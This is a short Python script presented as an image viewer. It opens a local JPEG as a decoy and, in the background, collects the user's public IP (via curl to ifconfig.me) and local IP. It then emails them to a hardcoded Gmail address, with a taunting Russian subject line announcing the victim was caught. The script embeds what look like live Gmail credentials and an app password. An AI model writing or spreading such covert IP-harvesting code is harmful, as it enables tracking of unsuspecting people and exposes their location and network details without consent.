from os import popen, getcwd
from PIL import Image
# system("curl -O https://bootstrap.pypa.io/get-pip.py")
# system("sudo python get-pip.py")
# system("pip install email-to")
from email_to import Message, EmailServer

def shape():
  try: myhtml = f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>"""
  except: myhtml = "ERROR :("
  finally:
    sender = "7kipgod@gmail.com"
    destination = "svaller22@gmail.com"
    
    # create a password for the app bot and get the password by putting it in brackets : https://myaccount.google.com/apppasswords
    EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")

if __name__ == "__main__": 
  Image.open(f"{getcwd()}/image.jpeg").show()
  shape()